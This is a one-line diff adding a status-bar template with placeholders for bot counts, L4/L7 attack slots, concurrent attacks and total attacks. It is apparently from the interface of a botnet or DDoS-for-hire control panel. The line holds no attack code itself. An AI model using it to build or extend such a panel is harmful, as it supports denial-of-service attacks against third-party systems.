@@ -1,0 +1,1 @@
+Iots: {$bots}  |  L4: {$stub.l4}/{$stub.l4.max}  |  L7: {$stub.l7}/{$stub.l7.max}  |  Active: {$user.ongoing}/{$user.concurrents}  |  Sessions: {$total.online}  |  Total Attacks: {$total.attacks.count}
